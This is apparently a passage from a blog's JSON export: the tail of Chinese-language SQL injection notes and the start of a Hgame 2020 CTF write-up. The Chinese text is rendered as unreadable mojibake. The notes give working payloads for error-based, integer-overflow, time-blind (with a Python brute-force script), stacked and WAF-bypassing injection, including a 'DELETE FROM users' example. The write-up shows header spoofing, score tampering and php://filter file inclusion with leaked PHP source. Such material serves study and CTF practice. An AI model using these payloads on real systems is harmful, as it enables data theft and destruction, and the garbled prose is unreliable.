1,2,#ï¼‰çš„ç¼˜æ•…:ä¸Šä¾‹æ˜¯ç¡®å®šäº†æ­¤è¡¨æœ‰ä¸‰åˆ—ï¼Œä¸ºæƒ³è¦çš„æ•°æ®å¾—åˆ°å±•ç¤ºï¼Œé€‰æ‹©ç¬¬ä¸‰åˆ—æ¥æ˜¾ç¤º;å½“å¦‚ï¼ˆunion 1,selcet ~,3#ï¼‰æ—¶æ•°æ®ä¼šå‡ºç°åœ¨ç¬¬äºŒåˆ—; æŠ¥é”™æ³¨å…¥XPathè¯­æ³•é”™è¯¯æ³¨å…¥extractvalue()extractvalue()ï¼šä»ç›®æ ‡XMLä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸²ã€‚EXTRACTVALUE (XML_document, XPath_string);ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²)concat:è¿”å›ç»“æœä¸ºè¿æ¥å‚æ•°äº§ç”Ÿçš„å­—ç¬¦ä¸²ã€‚å½“æˆ‘ä»¬åœ¨XPath_stringæ•…æ„å¡«å…¥é”™è¯¯çš„XPathæ—¶ï¼Œåœ¨å›æ˜¾æŠ¥é”™çš„åŒæ—¶ä¼šæ‰§è¡ŒXPathçš„sqlè¯­å¥ã€‚å¯æ ¹æ®æ­¤å‡½æ•°è¿›è¡ŒæŠ¥é”™æ³¨å…¥ // è¿™é‡Œæ˜¯ä¸ºäº†ç»•è¿‡ç©ºæ ¼çš„æ£€æµ‹ï¼Œæ‰€ä»¥ç”¨()æŠŠæ‰€æœ‰çš„ä¸œè¥¿åŒ…è£¹èµ·æ¥ // 0x7eæ˜¯â€œ~â€ï¼Œæ˜¯sqlçš„ä¸€å…ƒè¿ç®—ç¬¦ï¼Œå¯ä»¥é˜²æ­¢åœ¨å›æ˜¾çš„æ—¶å€™ä¸å›æ˜¾ç¬¬ä¸€ç»„æ•°æ® // å¯ä»¥çš„è¯æƒ³ç”¨0x5eâ€œ^â€ä¹Ÿå¯ä»¥... extractvalue(NULL,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables))))# extractvalue(NULL,concat(0x7e,(select(group_concat(schema_name))from(information_schema.schemata))))#UPDATEXML()UPDATEXML (XML_document, XPath_string, new_value);ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²)ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®å’Œä¸Šé¢åŒç†ï¼Œä½†éœ€è¦å¤šåŠ ä¸€ä¸ªNULL æ•´å‹æº¢å‡ºé”™è¯¯æ³¨å…¥ï¼ˆSQL&lt;5.5.53ï¼‰select ~0; &gt;&gt;&gt; 18446744073709551615è¿™é‡Œæˆ‘ä»¬å¯¹0è¿›è¡Œäº†å–åï¼Œå¯¼è‡´æ•°æ®æº¢å‡º select !(select * from (select user())x); &gt;&gt;&gt; 1å½“ä¸€æ¡è¯­å¥æ‰§è¡ŒæˆåŠŸæ—¶ï¼Œè¿”å›0ã€‚å› æ­¤éä¸€ä¸‹å°±å˜æˆäº†â€œ1â€. select exp(710); &gt;&gt;&gt; ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(710)&apos;è¿™é‡Œexp()è®¡ç®—è‡ªç„¶æŒ‡æ•°ã€‚åˆ°äº†710å°±å·²ç»æº¢å‡ºäº†ï¼Œæˆ‘ä»¬å°è¯•ï¼š select exp(~(select*from(select user())x)); &gt;&gt;&gt; DOUBLE value is out of range in &apos;exp(~((select &apos;root@localhost&apos; from dual)))&apos;è™½ç„¶æŠ¥é”™ï¼Œä½†æˆåŠŸè¿”å›ç”¨æˆ·ä¿¡æ¯ã€‚ä»¥æ­¤æ¥æ³¨å…¥ã€‚ æ—¶é—´ç›²æ³¨æ—¶é—´ç›²æ³¨åœ¨æ—¶é—´ç›²æ³¨ä¸­å…±ä½¿ç”¨äº†4ä¸ªæ¯”è¾ƒé‡è¦çš„è¯­å¥ï¼š sleep(s); # å°†è¯­å¥å»¶è¿Ÿsç§’ if(a,b,c); # å¦‚æœaè¯­å¥æˆç«‹ï¼Œæ‰§è¡Œbï¼Œå¦åˆ™æ‰§è¡Œc ascii(a); # å°†è¯­å¥açš„å­—ç¬¦è½¬æ¢ä¸ºascii(åè¿›åˆ¶) substr(a,b,c); # å°†açš„è¯­å¥ï¼Œä»b(num)çš„ä½ç½®å¼€å§‹ï¼Œæˆªå–c(num)ä¸ªå­—ç¬¦æˆ‘ä»¬å°†å…¶ä¸€ä¸ªä¸€ä¸ªç»“åˆèµ·æ¥å°±å¯ä»¥å¾—åˆ°ï¼š select if((ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),?,1))=?),sleep(5),1); # ä¸€ä¸€æ‹†åˆ†å¯¹åº” select if(@a,sleep(5),1) #å¦‚æœ@aè¯­å¥æˆç«‹ï¼Œæ‰§è¡Œsleep(5)ï¼Œå¦åˆ™è¿”å›1 @a=(ascii(@b)=?) #åˆ¤æ–­asciiåçš„@bæ˜¯å¦ç­‰äº?ä¸­çš„æ•°å­— @b=substr(@c,?,1) #ä»?å¤„å¼€å§‹ï¼Œæˆªå–@cè¯­å¥ä¸­çš„1ä¸ªå­—ç¬¦ @c=(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()) #æŸ¥è¡¨è¯­å¥ï¼Œå¯ä»¥å˜æ¢ä¸ºæŸ¥åˆ—ï¼ŒæŸ¥å­—æ®µçš„è¯­å¥ç”±æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å®ç°çˆ†ç ´æ¥è·å¾—ä¿¡æ¯è¿™é‡Œæ¥ä¸€ä¸ªpythonè„šæœ¬(ç‰ˆæœ¬&gt;3.0)ï¼ˆååˆ†è‡ƒè‚¿ import requests mode = input(&quot;plz input use mode:&quot;) # TæŸ¥è¡¨ CæŸ¥åˆ— FæŸ¥å­—æ®µ while(True): if(mode == &apos;T&apos;): payload = &apos;select if((ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s),sleep(5),1)&apos; break elif(mode == &apos;C&apos;): tab = input(&apos;plz input tables_name:&apos;) payload = &apos;select if((ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x&apos;+tab.encode(&apos;UTF-8&apos;).hex()+&apos;),%s,1)))=%s,sleep(5),1)&apos; break elif(mode == &apos;F&apos;): tab = input(&apos;plz input tables_name:&apos;) col = input(&apos;plz input col_name:&apos;) payload = &apos;select if((ascii(substr((select &apos;+ col +&apos; from &apos;+ tab +&apos; limit 0,1),%s,1))=%s),sleep(5),1)&apos; break elif(mode != &apos;F&apos;|&apos;C&apos;|&apos;T&apos;): print(&apos;Error&apos;) url = &apos;http://114514.com/FAQ.php&apos; res = &apos;&apos; sel_num = input(&quot;plz input sel_num:&quot;) # è¦æŸ¥è¯¢çš„å­—ç¬¦æ•° for i in range(1,sel_num): print(i) for j in range(32,127): print(chr(j)) now_payload = payload % (i,j) try: r = requests.post(url=url,data=now_payload,timeout=4.5) # è¿™é‡Œè§†æƒ…å†µæ›´æ”¹ except: res += chr(j) print(res)sqlå †å æ³¨å…¥åŸç†åœ¨ä¸€å®šæ¡ä»¶ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ â€œ ; â€ æå‰ç»“æŸsqlè¯­å¥ï¼Œå¹¶åœ¨åé¢è·Ÿä¸Šå…¶å®ƒsqlè¯­å¥ï¼Œå¾—åˆ°æ‰§è¡Œã€‚åœ¨myphpadminæˆ‘ä»¬ä¾¿å¯ä»¥è¿™æ ·å¤šå¥æ‰§è¡Œæ¯”å¦‚ï¼š $a = $_GET[&apos;a&apos;]; $sql = &quot;SELECT * FROM users WHERE id=$id&quot;;åœ¨è¿™é‡Œæˆ‘ä»¬ç”šè‡³å¯ä»¥æ„é€ ï¼š $a = &quot;1;DELETE FROM users&quot;;å°†æ•´ä¸ªusersè¡¨å…¨éƒ¨åˆ é™¤ï¼å¯è§å…¶å±å®³æœ‰å¤šå¤§ä¸è¿‡ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ç§æ³¨å…¥çš„å±€é™æ¯”è¾ƒå¤§â€¦å¯èƒ½æ•°æ®åº“å¼•æ“ä¸æ”¯æŒï¼Œæƒé™ä¸è¶³ç­‰â€¦éƒ½ä¼šå¯¼è‡´æ³¨å…¥å¤±è´¥ï¼Œè¿˜æœ‰å°±æ˜¯ï¼Œç»“æœä¸ä¸€å®šä¼šæœ‰å›æ˜¾â€¦yysy,æˆ‘åˆšå¼€å§‹æˆ‘ä»å­—é¢æ„æ€ä»¥ä¸ºæ˜¯ä»€ä¹ˆæ•°æ®æº¢å‡ºçš„éªšæ“ä½œï¼ˆ åº”ç”¨sqlé¢„å¤„ç†è¯­å¥åœ¨å¯ä»¥è¿›è¡Œå †å æ³¨å…¥æ—¶ï¼Œä¸”åƒâ€selectã€orâ€¦â€œç­‰é‡è¦è¯­å¥è¢«è¿‡æ»¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨sqlé¢„å¤„ç†è¯­å¥ SET @a=&quot;select * from users&quot;; #æ€ä¹ˆè¯´ï¼Ÿè®¾å®šäº†ä¸€ä¸ªaå˜é‡ PREPARE test FROM @a; #ä½¿test=@a EXECUTE test; #åŠ è½½testè¯­å¥è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œ@aæ‰€è®¾å®šçš„è¯­å¥å†æ¥ï¼Œæˆ‘ä»¬å°†æˆ‘ä»¬çš„@aæ‰€è®¾å®šçš„è¯­å¥è½¬æ¢ä¸ºhexï¼Œå³å¯ç»•è¿‡å¤§å¤šæ•°çš„wafè¿™é‡Œï¼Œæˆ‘ä»¬å°è¯•ï¼š http://114514.com/?id=1&apos;;SET+@a=0x73656C65637420736C656570283529;PREPARE+test+FROM+@a;EXECUTE+test;&quot; //select sleep(5);bypass - information_schemaåŸç†ä¹Ÿä¸æ˜¯ä»€ä¹ˆå¥‡æŠ€æ·«å·§ï¼Œåªæ˜¯æœ‰å…¶å®ƒçš„ç±»ä¼¼äºinformation_schemaçš„ä¸œè¥¿å¯ä»¥ç”¨æ¥æ›¿ä»£ã€‚è¿™é‡Œå…ˆåªç»™å‡ºpayloadï¼Œè¯¦ç»†åŸç†ä¹‹åè¡¥ä¸Šã€‚ä¸çŸ¥å…¶æ‰€ä»¥ç„¶æ˜¯ä¸è¡Œçš„ã€‚ # æ— è‡ªå¢idæ—¶ select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database(); +---+---+-------------------------------+ | 1 | 2 | group_concat(table_name) | +---+---+-------------------------------+ | 1 | 2 | users,emails,uagents,referers | +---+---+-------------------------------+ # æœ‰è‡ªå¢idæ—¶ select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()ï¼› +---+---+-------------------------------+ | 1 | 2 | group_concat(table_name) | +---+---+-------------------------------+ | 1 | 2 | emails,referers,uagents,users | +---+---+-------------------------------+https://www.anquanke.com/post/id/193512åŸä½œè€…è¯´ï¼Œå¯èƒ½è¿˜æœ‰æ›´å¤šæ–¹å¼ï¼Œä½†æˆ‘ç°åœ¨æ—¶é—´æœ‰é™ã€‚ä¹‹åå†è¯´ã€‚ asåˆ«åçš„æ— åˆ—åæ³¨å…¥åŸç†é€šè¿‡aså’Œè™šæ‹Ÿè¡¨æ¥ä½¿æ•°æ®å¯¼å…¥è‡³è™šæ‹Ÿè¡¨å¹¶èµ‹äºˆåˆ«åï¼Œä»¥æ­¤åœ¨ä¸çŸ¥é“åˆ—åçš„çŠ¶å†µä¸‹ï¼Œé€šè¿‡åˆ«åçªƒå–åˆ°æ•°æ®ã€‚ asè¯­å¥è¦äº†è§£æ­¤æ³¨å…¥å…ˆéœ€è¦çŸ¥é“ä»€ä¹ˆæ˜¯asã€‚å…¶å®ä¹Ÿç®€å•ï¼Œå®ƒå°±æ˜¯ä¸ºæ•°æ®èµ·äº†ä¸€ä¸ªåˆ«åã€‚ä¾‹å¦‚ï¼Œæˆ‘ä½¿ç”¨å¦‚ä¸‹è¯­å¥æŸ¥è¯¢åˆ°äº†ä»¥ä¸‹ç»“æœï¼š select * from users; +----+----------+------------+ | id | username | password | +----+----------+------------+ | 1 | Dumb | Dumb | | 2 | Angelina | I-kill-you | | 3 | Dummy | p@ssword | | 4 | secure | crappy | | 5 | stupid | stupidity | | 6 | superman | genious | | 7 | batman | mob!le | | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | | 11 | admin3 | admin3 | | 12 | dhakkan | dumbo | | 14 | admin4 | admin4 | +----+----------+------------+è¿™æ—¶å€™ï¼Œå¯èƒ½æœ‰äººä¸æ‡‚æ´‹æ–‡(æ¯”å¦‚æˆ‘)ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ç”¨asè¯­å¥è¿›è¡Œè½¬æ¢ï¼š select id as ç¼–å·,username as ç”¨æˆ·å,password as å¯†ç  from users; +--------+-----------+------------+ | ç¼–å· | ç”¨æˆ·å | å¯†ç  | +--------+-----------+------------+ | 1 | Dumb | Dumb | | 2 | Angelina | I-kill-you | | 3 | Dummy | p@ssword | | 4 | secure | crappy | | 5 | stupid | stupidity | | 6 | superman | genious | | 7 | batman | mob!le | | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | | 11 | admin3 | admin3 | | 12 | dhakkan | dumbo | | 14 | admin4 | admin4 | +--------+-----------+------------+å¯ä»¥å‘ç°ï¼Œidã€usernameã€passwordéƒ½å˜æˆäº†ä¸­æ–‡ã€‚ æ— åˆ—åæŸ¥è¯¢ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™å¹¶ä¸æ˜¯åœ¨åŸè¡¨ä¿®æ”¹çš„ï¼Œè€Œæ˜¯äº§ç”Ÿäº†ä¸€å¼ è™šæ‹Ÿè¡¨ã€‚è¿™ä½¿å¾—æˆ‘ä»¬å¯ä»¥ä¸ç”¨æŸ¥åˆ—åå³å¯è·å¾—æ•°æ®ã€‚è¿™å°±è®©æˆ‘ä»¬å¯ä»¥å¹²ä¸€äº›å¥‡æ€ªçš„äº‹æƒ…ã€‚æ³¨æ„ï¼Œè¿™é‡Œéœ€è¦çŸ¥é“è¡¨çš„åˆ—æ•°(å…¶å®ä¹Ÿå®¹æ˜“è·å–) select 1,2,3 as c; # è·å¾—äº†ä¸€å¼ è™šæ‹Ÿè¡¨ï¼Œæœ€ååˆ—åæ˜¯c +---+---+---+ | 1 | 2 | c | +---+---+---+ | 1 | 2 | 3 | +---+---+---+ select 1,2,3 as c union select * from users; # æˆ‘ä»¬å‘ç°åŸæœ‰çš„åˆ—åè¢«æ›¿æ¢äº† +----+----------+------------+ | 1 | 2 | c | +----+----------+------------+ | 1 | 2 | 3 | | 1 | Dumb | Dumb | | 2 | Angelina | I-kill-you | | 3 | Dummy | p@ssword | | 4 | secure | crappy | | 5 | stupid | stupidity | | 6 | superman | genious | | 7 | batman | mob!le | | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | | 11 | admin3 | admin3 | | 12 | dhakkan | dumbo | | 14 | admin4 | admin4 | +----+----------+------------+ # è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯¹è¿™ä¸ªè™šæ‹Ÿè¡¨å¹²ä¸€äº›å¥‡æ€ªçš„äº‹æƒ… select group_concat(c) from (select 1,2,3 as c union select * from users) as b; # è¿™é‡Œæ˜¯åˆå»ºç«‹äº†å¦ä¸€ä¸ªè¡¨ï¼Œè®©ä»–æŸ¥è¯¢æˆ‘ä»¬ä¹‹å‰å¯¼å…¥äº†æ•°æ®çš„è™šæ‹Ÿè¡¨ï¼Œä¾¿å¯ä»¥æå‡ºæ•°æ® # æ³¨æ„ï¼Œæ–°è¡¨ä¸€å®šè¦èµ·åˆ«åï¼Œä¸ç„¶ä¼šæŠ¥é”™(æŒ‡ä¸Šé¢çš„as b) # è¿™ä¸ªå¤ªé•¿äº†ï¼Œæˆ‘å°±åœ¨ä¸‹é¢æ”¾å›¾ç‰‡äº†","link":"/2020/02/24/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"},{"title":"ä¸å®Œæ•´çš„Hgame2020-CTFçš„WP","text":"2020-æ­ç”µHgameWP2020å¹´Hgameæ¯”èµ›WPç”±äºæˆ‘è¿‡äºèœé¸¡ï¼Œåªèƒ½æ‰“åˆ°week2äº†â€¦orz [TOC] week-1Cosmos çš„åšå®¢è€ƒå¯Ÿç‚¹/.gitä¿¡æ¯æ³„éœ² è¿‡ç¨‹åœ¨é¦–é¡µä¸­æç¤ºäº†å‡ºé¢˜äººåœ¨githubä¸Šä¿å­˜äº†åŸä»£ç ã€‚å°è¯•è®¿é—®http://cosmos.hgame.n3ko.co/.git/configã€‚å¾—åˆ°é¡¹ç›®ä¿å­˜çš„åœ°å€ã€‚æœ€ååœ¨https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc/commit/f79171d9c97a1ab3ea6c97b3eb4f0e1551549853çš„å†å²è®°å½•ä¸­å¾—åˆ°base64åçš„flagã€‚ hgame{g1t_le@k_1s_danger0us_!!!!}æ¥ å¤´ éœ¸ ç‹è€ƒå¯Ÿç‚¹è¯·æ±‚å¤´ è¿‡ç¨‹ç±»ä¼¼äº2019æå®¢å¤§æŒ‘æˆ˜çš„ ç¥ç§˜çš„ä¸‰å¶è‰ ä¸€é¢˜ã€‚ä½†å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é“é¢˜è¿˜è€ƒå¯Ÿäº†ä¸€ä¸ªè¯·æ±‚å‚æ•°If-Unmodified-Since:&lt;time&gt;ç®€å•æ¥è¯´ï¼Œè¿™ä¸ªå‚æ•°çš„ä½œç”¨æ˜¯è¿›è¡Œä¸€ä¸ªåˆ¤æ–­ï¼š å¦‚æœ (åœ¨`&lt;time&gt;`æ—¶é—´ç‚¹ä¹‹åï¼Œæ–‡ä»¶æ²¡æœ‰è¢«ä¿®æ”¹) åˆ™ ä¸‹è½½æ–‡ä»¶ å¦åˆ™ è¿”å›412é”™è¯¯è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒç›¸ä¼¼çš„å‚æ•°If-Modified-Since:&lt;time&gt;å’ŒIf-Unmodified-Since:&lt;time&gt;æ˜¯åç€æ¥çš„ï¼š å¦‚æœ (åœ¨`&lt;time&gt;`æ—¶é—´ç‚¹ä¹‹åï¼Œæ–‡ä»¶ä¿®æ”¹è¿‡äº†) åˆ™ ä¸‹è½½æ–‡ä»¶ å¦åˆ™ è¿”å›304é”™è¯¯åœ¨è¿™é“é¢˜åªéœ€å°†è¯·æ±‚å¤´ä¿®æ”¹å³å¯ï¼š POST http://kyaru.hgame.n3ko.co/ HTTP/1.1 Host: kyaru.hgame.n3ko.co Referer: https://vidar.club X-Forwarded-For: 127.0.0.1 User-Agent: Cosmos/114514 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 If-Unmodified-Since: Fri, 01 Jan 1077 00:00:00 GMT Content-Length: 0PS:è¿™é“é¢˜æœ€å¼€å§‹ä½¿ç”¨GETè¯·æ±‚å³å¯ï¼Œä½†åé¢ä¸çŸ¥é“ä¸ºä»€ä¹ˆåˆæ”¹æˆäº†POST hgame{W0w!Your_heads_@re_s0_many!}PSS:è‡³äºä¸ºä»€ä¹ˆä¸€å®šæ˜¯If-Unmodified-Sinceâ€¦å¯èƒ½åªæ˜¯å‡ºé¢˜äººå•çº¯æ£€æµ‹äº†ä¸€ä¸‹è¯·æ±‚ï¼Ÿäº¦æˆ–è€…æ˜¯å…¶å®ƒæ–¹å¼ï¼Ÿå¥½å¥‡åç«¯æ˜¯æ€ä¹ˆå®ç°çš„â€¦ Code Worldè€ƒå¯Ÿç‚¹å“åº” è¿‡ç¨‹åˆæ¬¡æ‰“å¼€è¿”å›äº†403ï¼Œé¡µé¢ä¸ºnew.phpï¼Œä¸”æ‰“å¼€æ¯”è¾ƒæ…¢ï¼Œä¾¿æ€€ç–‘æœ‰é¡µé¢é‡å®šå‘ã€‚å°è¯•æŠ“åŒ…å‘ç°æœç„¶å¦‚æ­¤ï¼Œå¹¶æç¤ºäº†405é”™è¯¯ã€‚è¯´æ˜è¯·æ±‚æ–¹å¼æœ‰è¯¯ï¼Œå°è¯•POSTè¯·æ±‚ã€‚è¯·æ±‚åå‡ºç°è¿™æ ·ä¸€æ®µè¯(å·²æ ¼å¼åŒ–)ï¼š &lt;center&gt; &lt;h1&gt;äººé¸¡éªŒè¯&lt;/h1&gt; &lt;br&gt; &lt;br&gt; ç›®å‰å®ƒåªæ”¯æŒé€šè¿‡urlæäº¤å‚æ•°æ¥è®¡ç®—ä¸¤ä¸ªæ•°çš„ç›¸åŠ ï¼Œå‚æ•°ä¸ºa &lt;br&gt; &lt;br&gt; ç°åœ¨,éœ€è¦è®©ç»“æœä¸º10 &lt;/center&gt;åˆ™æäº¤ï¼š POST http://codeworld.hgame.day-day.work/?a=5%2B5 HTTP/1.1 Host: codeworld.hgame.day-day.work User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1å³å¯è·å¾—flagè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸€èˆ¬æµè§ˆå™¨é‡Œä¼šæŠŠ+è®¤ä¸ºæ˜¯ç©ºæ ¼ï¼Œè¿™æ—¶å€™æäº¤%2Bå³å¯ã€‚ hgame{C0d3_1s_s0_S@_sO_C0ol!}ğŸ”å°¼æ³°ç«è€ƒå¯Ÿç‚¹æŠ“åŒ…æ”¹åŒ…(jsä»£ç å®¡è®¡) æ–¹æ³•ä¸€åœ¨æ¸¸æˆè¿‡ç¨‹ä¸­è¿›è¡ŒæŠ“åŒ…ï¼Œå‘ç°äº†ä¸€æ¡å¥‡æ€ªçš„è¯·æ±‚ POST http://cxk.hgame.wz22.cc/submit HTTP/1.1 Host: cxk.hgame.wz22.cc User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 42 score=400|68ae153a367158c60103d39d867c365aè¿™é‡Œscore=400ä¾¿æ˜¯æˆ‘è¿™æ¬¡æ¸¸æˆçš„åˆ†æ•°ï¼Œåé¢çš„ä¸€ä¸²æ•°æ®ä¹‹åçš„ä»£ç å®¡è®¡è§£é‡Šã€‚æˆ‘ä»¬è¿›è¡Œæ”¹åŒ…ï¼Œå°†400æ”¹ä¸ºä»–æ‰€è¦æ±‚çš„30000ä¾¿ä¼šå¾—åˆ°alertçš„flagäº†ã€‚ hgame{j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!}æ–¹æ³•äºŒè¿™é‡Œæˆ‘ä»¬å¯¹æ¸¸æˆçš„jsä»£ç è¿›è¡Œå®¡è®¡åœ¨game.jsä¸­å‘ç°è¿™æ ·ä¸€æ®µï¼ˆå·²æ ¼å¼åŒ–ï¼‰ gameOver() { let po = &quot;ejIy&quot;; let rt = po + &quot;LmNj&quot;; let rou = &quot;L3N1Ym&quot;; let sche = &quot;aHR0c&quot;; let k = &quot;c2Nv&quot;; let me = sche + &quot;DovL2N&quot;; clearInterval(this.timer) this.context.clearRect(0, 0, this.canvas.width, this.canvas.height) let stamp = md5(Date.parse(new Date()) / 1000); this.globalScore = this.globalScore + this.storageScore; this.context.font = &apos;32px Microsoft YaHei&apos; this.context.fillStyle = &apos;#000&apos; this.context.fillText(&apos;CXKï¼Œä½ çƒæ‰äº†ï¼å¾—åˆ†ï¼š&apos; + this.globalScore, 404, 226) $(&quot;#ballspeedset&quot;).removeAttr(&quot;disabled&quot;); let s = this.globalScore; ( function () { let getU = me + &quot;4ay5oZ&quot;; let rl = getU + &quot;2FtZS53&quot;; let te = rou + &quot;1pdA&quot;; let ey = k + &quot;cmU=&quot;; $.post(atob(rl + rt + te), atob(ey) + &quot;=&quot; + s + &quot;|&quot; + stamp, function (data) { alert(data); }) } )(); this.globalScore = 0; }å…¶ä¸­ let po = &quot;ejIy&quot;; let rt = po + &quot;LmNj&quot;; let rou = &quot;L3N1Ym&quot;; let sche = &quot;aHR0c&quot;; let k = &quot;c2Nv&quot;; let me = sche + &quot;DovL2N&quot;; let getU = me + &quot;4ay5oZ&quot;; let rl = getU + &quot;2FtZS53&quot;; let te = rou + &quot;1pdA&quot;; let ey = k + &quot;cmU=&quot;; $.post(atob(rl + rt + te), atob(ey) + &quot;=&quot; + s + &quot;|&quot; + stamp, function (data) { alert(data); }) //å…¶ä¸­(é•¿è§è¯†äº†ï¼ˆï¼ˆï¼ˆ) //rl=getUrl, rt=port, te=route, ey=key //base64è§£ç åå‘ç°å®Œæ•´çš„postæ–¹æ³•ä¸º $.post(&quot;http://cxk.hgame.wz22.cc/submit&quot;, &quot;score&quot; + &quot;=&quot; + s + &quot;|&quot; + stamp, function (data) { alert(data); }) //å³å‘ http://cxk.hgame.wz22.cc/submit å‘é€æ•°æ®score=s|stampï¼Œä¹‹åè¿”å›çš„æ•°æ®ä¼šä»¥alertçš„å½¢å¼è¾“å‡º //å…¶ä¸­sä¸ºæˆ‘ä»¬çš„æ¸¸æˆåˆ†æ•° //stampä¸º let stamp = md5(Date.parse(new Date()) / 1000); åœ¨åˆ†æå®Œä»£ç åï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ä¿®æ”¹jsæºç ï¼Œä¼ªé€ æ•°æ®ï¼Œè·å¾—flag hgame{j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!}week-2Cosmosçš„åšå®¢åå°è€ƒå¯Ÿç‚¹é€»è¾‘æ¼æ´ä¸€äº›phpçš„å‡½æ•°ç¼ºé™· è¿‡ç¨‹åœ¨æœ€å¼€å§‹å¯ä»¥å¾—åˆ°ä¸€ä¸ªç™»å½•é¡µé¢ã€‚éšå³å¯ä»¥å‘ç°urlç–‘ä¼¼å¯ä»¥è¿›è¡Œæ–‡ä»¶åŒ…å«ã€‚http://cosmos-admin.hgame.day-day.work/index.php?action=login.phpå°†login.phpæ›¿æ¢ä¸ºæ ¹ç›®å½•ä¸‹çš„/flagè¿”å›äº†Hacker get outåº”è¯¥æ˜¯è¢«è¿‡æ»¤äº†ã€‚å°è¯•ç”¨phpä¼ªåè®®ä¸­çš„php://filter/readæ¥è¿›è¡Œphpæºç çš„è¯»å–ã€‚å¾—åˆ°login.phpå’Œindex.phpçš„æºç ã€‚åœ¨login.phpæºç é‡Œé¡ºè—¤æ‘¸ç“œå¾—åˆ°äº†admin.phpæ–‡ä»¶æºç ã€‚åœ¨å…¶ä¸­è¿˜çŸ¥é“äº†ä¸€ä¸ªconfig.phpæ–‡ä»¶ï¼Œä½†è¢«è¿‡æ»¤äº†ï¼Œæ— æ³•è¯»å–ã€‚PSï¼šæ–¹ä¾¿èµ·è§è¿™é‡Œåªå±•ç¤ºphpæºç ã€‚ login.php &lt;?php include &quot;config.php&quot;; session_start(); //Only for debug if (DEBUG_MODE){ if(isset($_GET[&apos;debug&apos;])) { $debug = $_GET[&apos;debug&apos;]; if (!preg_match(&quot;/^[a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff]*$/&quot;, $debug)) { die(&quot;args error!&quot;); } eval(&quot;var_dump($$debug);&quot;); } } if(isset($_SESSION[&apos;username&apos;])) { header(&quot;Location: admin.php&quot;); exit(); } else { if (isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;])) { if ($admin_password == md5($_POST[&apos;password&apos;]) &amp;&amp; $_POST[&apos;username&apos;] === $admin_username){ $_SESSION[&apos;username&apos;] = $_POST[&apos;username&apos;]; header(&quot;Location: admin.php&quot;); exit(); } else { echo &quot;??Â¨??Â·???????Ë‰?? ?Ã©??Ã¨Ë‰Ë‰&quot;; } } } ?&gt;index.php &lt;?php error_reporting(0); session_start(); if(isset($_SESSION[&apos;username&apos;])) { header(&quot;Location: admin.php&quot;); exit(); } $action = @$_GET[&apos;action&apos;]; $filter = &quot;/config|etc|flag/i&quot;; if (isset($_GET[&apos;action&apos;]) &amp;&amp; !empty($_GET[&apos;action&apos;])) { if(preg_match($filter, $_GET[&apos;action&apos;])) { echo &quot;Hacker get out!&quot;; exit(); } include 